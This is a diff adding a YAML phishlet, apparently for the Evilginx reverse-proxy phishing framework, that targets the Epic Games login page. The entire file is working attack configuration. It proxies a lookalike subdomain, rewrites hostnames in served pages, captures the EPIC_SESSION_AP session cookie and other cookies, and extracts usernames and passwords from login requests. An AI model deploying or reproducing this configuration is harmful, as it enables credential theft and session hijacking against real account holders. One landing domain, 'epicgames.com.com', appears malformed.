@@ -1,0 +1,28 @@
+author: '@jerp'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'epicgames', orig_sub: 'www', domain: 'epicgames.com.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'epicgames', orig_sub: 'www', domain: 'epicgames.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.epicgames.com', orig_sub: 'www', domain: 'epicgames.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.epicgames.com', orig_sub: 'www', domain: 'epicgames.com', search: 'application/json;charset=utf-8', replace: 'application/json', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: 'www.epicgames.com/account/personal'
+    keys: ['EPIC_SESSION_AP','.*,regexp']
+
+credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)"'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)"'
+    type: 'json'
+
+login:
+  domain: 'www.epicgames.com'
+  path: 'id/login/epic'
